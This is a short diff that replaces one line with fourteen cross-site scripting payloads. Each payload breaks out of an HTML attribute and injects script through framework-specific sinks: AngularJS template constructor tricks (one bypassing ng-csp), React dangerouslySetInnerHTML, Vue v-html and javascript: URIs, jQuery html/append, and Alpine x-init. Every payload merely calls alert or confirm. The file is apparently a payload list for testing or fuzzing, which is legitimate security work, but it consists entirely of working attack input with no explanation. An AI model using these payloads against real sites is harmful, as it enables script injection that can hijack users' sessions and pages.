@@ -1,1 +1,14 @@
-dvs
+"><img src=x ng-src="{{constructor.constructor('alert(1)')()}}">
+"><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
+"><div ng-app>{{'a'.constructor.constructor('alert(1)')()}}</div>
+"><img src=x onerror={(()=>confirm(1))()}>
+"><button onClick={()=>confirm(1)}>Click</button>
+"><div dangerouslySetInnerHTML={{__html:"<img src=x onerror=confirm(1)>"}}
+"><div v-html="'<img src=x onerror=confirm(1)>'"></div>
+"><div :src="'javascript:confirm(1)'"></div>
+"><input v-model="constructor.constructor('confirm(1)')()">
+"><script>$(document).ready(function(){confirm(1)})</script>
+"><script>$('#x').html('<img src=x onerror=confirm(1)>')</script>
+"><script>$('body').append('<img src=x onerror=confirm(1)>')</script>
+"><div x-data="{x: 1}" x-init="confirm(x)">XSS</div>
+"><div x-data x-init="confirm(1)">XSS</div>
